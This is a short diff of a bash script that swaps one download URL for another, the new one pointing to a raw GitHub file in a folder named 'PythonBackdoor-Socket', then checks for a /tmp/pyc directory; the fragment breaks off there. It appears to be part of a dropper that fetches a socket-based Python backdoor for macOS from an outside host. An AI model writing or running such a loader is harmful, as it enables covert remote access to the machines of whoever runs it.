@@ -1,5 +1,5 @@
 #!/bin/bash
-URL="https://www.dropbox.com/s/wdkbnelbu6tr8i7/pyc.txt?dl=0"
+URL="https://raw.githubusercontent.com/mArm-ch/FunnyTools/master/MacOS/PythonBackdoor-Socket/pyc.py"
 
 if [ -d "/tmp/pyc" ]
 then
